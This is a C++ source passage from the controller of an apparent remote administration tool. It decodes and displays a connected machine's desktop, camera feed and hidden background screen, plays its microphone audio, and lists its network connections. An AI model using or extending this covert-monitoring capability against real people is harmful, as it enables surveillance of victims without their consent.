                    LPVOID pBuf = GlobalLock(hGlobal);
                    if (pBuf) {
                        memcpy(pBuf, pData, dataLen);
                        GlobalUnlock(hGlobal);
                        IStream* pStream = NULL;
                        if (CreateStreamOnHGlobal(hGlobal, TRUE, &pStream) == S_OK) {
                            Bitmap* pBitmap = Bitmap::FromStream(pStream);
                            if (pBitmap && pBitmap->GetLastStatus() == Ok) {
                                pBitmap->GetHBITMAP(Color(0,0,0), &hFragment);
                                delete pBitmap;
                            }
                            pStream->Release();
                        }
                    }
                }
            }

            if (!hFragment) {
                 if (s_screenLogState[clientId] != -1) {
                    AddLog(L"桌面", L"画面解码失败");
                    s_screenLogState[clientId] = -1;
                }
                return;
            }

            // 获取 Fragment 尺寸
            BITMAP bmFrag;
            GetObject(hFragment, sizeof(BITMAP), &bmFrag);

            // 如果是全量包，重置尺寸
            if (!isDiff) {
                w = bmFrag.bmWidth;
                h = bmFrag.bmHeight;
                x = 0;
                y = 0;
            }

            // 检查/初始化 BackBuffer
            HDC hScreenDC = GetDC(NULL);
            bool needRecreate = false;

            if (!client->hScreenBackBuffer) {
                needRecreate = true;
                if (isDiff) {
                    // 只有 Diff 包但没有 BackBuffer，通常不应该发生（除非第一个包就是 Diff 且有 Bug）
                    // 但为了容错，我们假设屏幕大小至少要容纳这个 Fragment
                    // 或者更安全：直接把 Fragment 当作 BackBuffer (如果 (0,0))
                    client->backBufferWidth = w + x;
                    client->backBufferHeight = h + y;
                } else {
                    client->backBufferWidth = w;
                    client->backBufferHeight = h;
                }
            } else if (!isDiff) {
                 // 全量包，尺寸变了需要重建
                 if (w != client->backBufferWidth || h != client->backBufferHeight) {
                     needRecreate = true;
                     client->backBufferWidth = w;
                     client->backBufferHeight = h;
                 }
            }

            if (needRecreate) {
                if (client->hScreenBackBuffer) DeleteObject(client->hScreenBackBuffer);
                if (client->hBackBufferDC) DeleteDC(client->hBackBufferDC);
                
                client->hScreenBackBuffer = CreateCompatibleBitmap(hScreenDC, client->backBufferWidth, client->backBufferHeight);
                client->hBackBufferDC = CreateCompatibleDC(hScreenDC);
                SelectObject(client->hBackBufferDC, client->hScreenBackBuffer);
            }

            // 绘制 Fragment 到 BackBuffer
            HDC hFragDC = CreateCompatibleDC(hScreenDC);
            HBITMAP hOld = (HBITMAP)SelectObject(hFragDC, hFragment);
            
            // 修复 RAW 模式下画面倒置的问题
            // 如果是 BMP (RAW)，由于 DIB 的存储顺序可能导致倒置，这里强制垂直翻转绘制
            if (isBmp) {
                StretchBlt(client->hBackBufferDC, x, y, bmFrag.bmWidth, bmFrag.bmHeight, 
                           hFragDC, 0, bmFrag.bmHeight - 1, bmFrag.bmWidth, -bmFrag.bmHeight, SRCCOPY);
            } else {
                BitBlt(client->hBackBufferDC, x, y, bmFrag.bmWidth, bmFrag.bmHeight, hFragDC, 0, 0, SRCCOPY);
            }
            
            SelectObject(hFragDC, hOld);
            DeleteDC(hFragDC);
            DeleteObject(hFragment);
            
            // 创建用于显示的副本
            HBITMAP hDisplayBmp = CreateCompatibleBitmap(hScreenDC, client->backBufferWidth, client->backBufferHeight);
            HDC hDisplayDC = CreateCompatibleDC(hScreenDC);
            SelectObject(hDisplayDC, hDisplayBmp);
            BitBlt(hDisplayDC, 0, 0, client->backBufferWidth, client->backBufferHeight, client->hBackBufferDC, 0, 0, SRCCOPY);
            DeleteDC(hDisplayDC);
            ReleaseDC(NULL, hScreenDC);

            HBITMAP hOldBmp = (HBITMAP)SendMessage(hStatic, STM_GETIMAGE, IMAGE_BITMAP, 0);
            if (hOldBmp) DeleteObject(hOldBmp);
            SendMessage(hStatic, STM_SETIMAGE, IMAGE_BITMAP, (LPARAM)hDisplayBmp);
            InvalidateRect(hStatic, NULL, FALSE);
            
            if (s_screenLogState[clientId] != 1) {
                AddLog(L"桌面", isDiff ? L"更新局部画面" : L"更新全屏画面");
                s_screenLogState[clientId] = 1;
            }

            PostMessageW(client->hDesktopDlg, WM_APP_DESKTOP_FRAME, (WPARAM)dataLen, (LPARAM)1);
        }
    }
}

void CommandHandler::HandleVideoStream(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }

    if (client->hVideoDlg && IsWindow(client->hVideoDlg)) {
        HWND hStatic = GetDlgItem(client->hVideoDlg, IDC_STATIC_VIDEO);
        if (hStatic && pkg->arg1 > 0) {
            HBITMAP hBitmap = NULL;
            HGLOBAL hGlobal = GlobalAlloc(GMEM_MOVEABLE, pkg->arg1);
            if (hGlobal) {
                LPVOID pBuf = GlobalLock(hGlobal);
                memcpy(pBuf, pkg->data, pkg->arg1);
                GlobalUnlock(hGlobal);
                IStream* pStream = NULL;
                if (CreateStreamOnHGlobal(hGlobal, TRUE, &pStream) == S_OK) {
                    Gdiplus::Bitmap* pBitmap = Gdiplus::Bitmap::FromStream(pStream);
                    if (pBitmap && pBitmap->GetLastStatus() == Gdiplus::Ok) {
                        pBitmap->GetHBITMAP(Gdiplus::Color(0,0,0), &hBitmap);
                        delete pBitmap;
                    }
                    pStream->Release();
                }
            }
            if (hBitmap) {
                HBITMAP hOldBmp = (HBITMAP)SendMessage(hStatic, STM_GETIMAGE, IMAGE_BITMAP, 0);
                if (hOldBmp) DeleteObject(hOldBmp);
                SendMessage(hStatic, STM_SETIMAGE, IMAGE_BITMAP, (LPARAM)hBitmap);
                InvalidateRect(hStatic, NULL, FALSE);
            }
        }
    }
}

void CommandHandler::HandleVoiceStream(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }

    if (!client->hWaveOut) {
        WAVEFORMATEX wfx = { 0 };
        wfx.wFormatTag = WAVE_FORMAT_PCM;
        wfx.nChannels = 1;
        wfx.nSamplesPerSec = 8000;
        wfx.wBitsPerSample = 16;
        wfx.nBlockAlign = wfx.nChannels * wfx.wBitsPerSample / 8;
        wfx.nAvgBytesPerSec = wfx.nSamplesPerSec * wfx.nBlockAlign;
        wfx.cbSize = 0;
        waveOutOpen(&client->hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    }

    if (!client->hWaveOut) return;

    // PCM 数据直接播放
    WAVEHDR* pWh = (WAVEHDR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(WAVEHDR));
    if (pWh) {
        pWh->lpData = (LPSTR)HeapAlloc(GetProcessHeap(), 0, pkg->arg1);
        if (pWh->lpData) {
            memcpy(pWh->lpData, pkg->data, pkg->arg1);
            pWh->dwBufferLength = pkg->arg1;
            waveOutPrepareHeader(client->hWaveOut, pWh, sizeof(WAVEHDR));
            waveOutWrite(client->hWaveOut, pWh, sizeof(WAVEHDR));
        } else {
            HeapFree(GetProcessHeap(), 0, pWh);
        }
    }
}

void CommandHandler::HandleNetworkList(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (g_Clients.count(clientId)) client = g_Clients[clientId];
    }
    
    if (!client || !client->hNetworkDlg || !IsWindow(client->hNetworkDlg)) return;

    HWND hList = GetDlgItem(client->hNetworkDlg, IDC_LIST_NETWORK);
    SendMessageW(hList, WM_SETREDRAW, FALSE, 0);
    ListView_DeleteAllItems(hList);

    std::string data(pkg->data, pkg->arg1);
    std::stringstream ss(data);
    std::string line;
    
    int i = 0;
    while (std::getline(ss, line)) {
        if (line.empty()) continue;
        
        std::vector<std::string> tokens = Utils::StringHelper::Split(line, '|');
        if (tokens.size() < 7) continue;
        
        std::wstring protocol = Utils::StringHelper::UTF8ToWide(tokens[0]);
        std::wstring localIp = Utils::StringHelper::UTF8ToWide(tokens[1]);
        std::wstring localPort = Utils::StringHelper::UTF8ToWide(tokens[2]);
        std::wstring remoteIp = Utils::StringHelper::UTF8ToWide(tokens[3]);
        std::wstring remotePort = Utils::StringHelper::UTF8ToWide(tokens[4]);
        std::wstring state = Utils::StringHelper::UTF8ToWide(tokens[5]);
        std::wstring pid = Utils::StringHelper::UTF8ToWide(tokens[6]);
        std::wstring procName = tokens.size() > 7 ? Utils::StringHelper::UTF8ToWide(tokens[7]) : L"";
        std::wstring procFolder = tokens.size() > 8 ? Utils::StringHelper::UTF8ToWide(tokens[8]) : L"";
        std::wstring procDir = tokens.size() > 8 ? Utils::StringHelper::UTF8ToWide(tokens[8]) : L"";
        uint32_t pidValue = (uint32_t)strtoul(tokens[6].c_str(), nullptr, 10);
        
        LVITEMW lvi = { 0 };
        lvi.mask = LVIF_TEXT | LVIF_PARAM;
        lvi.iItem = i;
        lvi.pszText = (LPWSTR)procName.c_str();
        lvi.lParam = (LPARAM)pidValue;
        int index = (int)SendMessageW(hList, LVM_INSERTITEMW, 0, (LPARAM)&lvi);
        
        ListView_SetItemText(hList, index, 1, (LPWSTR)pid.c_str());
        ListView_SetItemText(hList, index, 2, (LPWSTR)protocol.c_str());
        ListView_SetItemText(hList, index, 3, (LPWSTR)localIp.c_str());
        ListView_SetItemText(hList, index, 4, (LPWSTR)localPort.c_str());
        ListView_SetItemText(hList, index, 5, (LPWSTR)remoteIp.c_str());
        ListView_SetItemText(hList, index, 6, (LPWSTR)remotePort.c_str());
        ListView_SetItemText(hList, index, 7, (LPWSTR)state.c_str());
        ListView_SetItemText(hList, index, 8, (LPWSTR)procDir.c_str());
        
        i++;
    }
    
    SendMessageW(hList, WM_SETREDRAW, TRUE, 0);
}

void CommandHandler::HandleBackgroundScreenCapture(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }

    if (client->hBackgroundDlg && IsWindow(client->hBackgroundDlg)) {
        HWND hStatic = GetDlgItem(client->hBackgroundDlg, IDC_STATIC_BACK_SCREEN);
        if (hStatic && pkg->arg1 > 0) {
            // 解码 JPEG 数据 (pkg->data, pkg->arg1)
            HBITMAP hBitmap = NULL;
            HGLOBAL hGlobal = GlobalAlloc(GMEM_MOVEABLE, pkg->arg1);
            if (hGlobal) {
                void* pBuf = GlobalLock(hGlobal);
                if (pBuf) {
                    memcpy(pBuf, pkg->data, pkg->arg1);
                    GlobalUnlock(hGlobal);
                    IStream* pStream = NULL;
                    if (CreateStreamOnHGlobal(hGlobal, TRUE, &pStream) == S_OK) {
                        Bitmap* pBmp = Bitmap::FromStream(pStream);
                        if (pBmp && pBmp->GetLastStatus() == Ok) {
                            pBmp->GetHBITMAP(Color(0,0,0), &hBitmap);
                            delete pBmp;
                        }
                        pStream->Release();
                    }
                }
            }

            if (hBitmap) {
                // 设置到控件上显示
                HBITMAP hOldBmp = (HBITMAP)SendMessage(hStatic, STM_SETIMAGE, IMAGE_BITMAP, (LPARAM)hBitmap);
                if (hOldBmp) DeleteObject(hOldBmp);
                
                // 触发重绘
                InvalidateRect(hStatic, NULL, FALSE);
            }
        }
    }
}

void CommandHandler::HandleBackgroundGeneric(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }

    if (client->hBackgroundDlg && IsWindow(client->hBackgroundDlg)) {
        if (pkg->cmd == CMD_BACKGROUND_CREATE || pkg->cmd == CMD_BACKGROUND_EXECUTE) {
            std::string msg((char*)pkg->data, pkg->arg1);
            std::wstring wMsg = Utils::StringHelper::UTF8ToWide(msg);
            if (wMsg.empty() && !msg.empty()) {
                wMsg = Utils::StringHelper::ANSIToWide(msg);
            }
            MessageBoxW(client->hBackgroundDlg, wMsg.c_str(), L"后台管理", MB_OK | MB_ICONINFORMATION);
        }
    }
}

} // namespace Core
} // namespace Formidable
